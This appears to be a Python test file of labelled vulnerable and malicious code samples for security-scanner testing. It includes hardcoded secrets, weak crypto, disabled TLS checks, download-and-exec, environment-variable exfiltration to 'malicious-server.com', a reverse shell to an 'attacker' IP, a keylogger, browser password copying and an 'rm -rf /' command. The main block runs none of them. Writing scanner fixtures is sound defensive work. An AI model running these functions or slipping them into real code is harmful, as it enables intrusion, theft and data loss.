#!/usr/bin/env python3
"""
Additional malicious code patterns for security scanner testing
"""

import hashlib
import tempfile
import urllib.request
import socket
import ssl
import base64
from Crypto.Cipher import DES  # Weak encryption
import ftplib

# ❌ VULNERABLE: Hardcoded credentials and sensitive data
FTP_PASSWORD = "password123"
PRIVATE_KEY = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA..."
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
DATABASE_URL = "postgresql://admin:secret@localhost:5432/mydb"

class InsecureCrypto:
    """Class demonstrating weak cryptographic practices"""
    
    @staticmethod
    def weak_hash(data):
        # ❌ VULNERABLE: Using weak hashing algorithms
        return hashlib.md5(data.encode()).hexdigest()
    
    @staticmethod
    def weak_encryption(data, key):
        # ❌ VULNERABLE: Using DES encryption (deprecated and weak)
        cipher = DES.new(key[:8], DES.MODE_ECB)
        return cipher.encrypt(data.ljust(8)[:8])

class NetworkVulnerabilities:
    """Network-related security vulnerabilities"""
    
    @staticmethod
    def insecure_ssl():
        # ❌ VULNERABLE: Disabling SSL verification
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context
    
    @staticmethod
    def download_and_execute(url):
        # ❌ VULNERABLE: Downloading and executing remote code
        response = urllib.request.urlopen(url)
        code = response.read().decode()
        exec(code)  # Extremely dangerous!
    
    @staticmethod
    def bind_to_all_interfaces():
        # ❌ VULNERABLE: Binding to all network interfaces
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', 8080))  # Dangerous in production
        return sock

class FileSystemVulnerabilities:
    """File system related vulnerabilities"""
    
    @staticmethod
    def unsafe_temp_file():
        # ❌ VULNERABLE: Insecure temporary file creation
        temp_file = "/tmp/myapp_" + str(random.randint(1000, 9999))
        with open(temp_file, 'w') as f:
            f.write("sensitive data")
        return temp_file
    
    @staticmethod
    def world_writable_file():
        # ❌ VULNERABLE: Creating world-writable files
        import os
        import stat
        
        filename = "config.txt"
        with open(filename, 'w') as f:
            f.write("secret configuration")
        
        # Make file world-writable (dangerous!)
        os.chmod(filename, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)

def backdoor_function():
    """❌ MALICIOUS: Hidden backdoor functionality"""
    import os
    import base64
    
    # Obfuscated malicious command
    cmd = base64.b64decode("Y2F0IC9ldGMvcGFzc3dk").decode()  # "cat /etc/passwd"
    os.system(cmd)

def data_exfiltration():
    """❌ MALICIOUS: Data exfiltration attempt"""
    import urllib.request
    import json
    
    # Simulate collecting sensitive data
    sensitive_data = {
        "env_vars": dict(os.environ),
        "user": os.getlogin(),
        "hostname": socket.gethostname()
    }
    
    # ❌ VULNERABLE: Sending data to external server
    payload = json.dumps(sensitive_data).encode()
    req = urllib.request.Request("http://malicious-server.com/collect", data=payload)
    urllib.request.urlopen(req)

class MaliciousPatterns:
    """Various malicious patterns that should be detected"""
    
    @staticmethod
    def reverse_shell():
        # ❌ MALICIOUS: Reverse shell implementation
        import subprocess
        import socket
        
        HOST = "192.168.1.100"  # Attacker's IP
        PORT = 4444
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        
        # Redirect stdin/stdout/stderr to socket
        subprocess.call(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
    
    @staticmethod
    def keylogger():
        # ❌ MALICIOUS: Simple keylogger
        try:
            from pynput import keyboard
            
            def on_press(key):
                with open("keylog.txt", "a") as f:
                    f.write(f"{key}\n")
            
            keyboard.Listener(on_press=on_press).start()
        except ImportError:
            pass
    
    @staticmethod
    def password_stealer():
        # ❌ MALICIOUS: Attempt to steal saved passwords
        import os
        import shutil
        
        # Common browser password locations
        chrome_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")
        firefox_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/*/logins.json")
        
        try:
            if os.path.exists(chrome_path):
                shutil.copy2(chrome_path, "/tmp/stolen_chrome_passwords.db")
        except Exception:
            pass

# ❌ VULNERABLE: Dangerous imports and obfuscation
evil_import = __import__('os')
exec_func = getattr(__builtins__, 'exec')

# ❌ MALICIOUS: Obfuscated malicious code
obfuscated = compile("__import__('os').system('rm -rf /')", "<string>", "exec")

if __name__ == "__main__":
    # ❌ VULNERABLE: Unsafe operations
    print("Running malicious test patterns...")
    
    # Don't actually execute the dangerous functions in a real environment!
    # These are just patterns for security scanners to detect
    pass
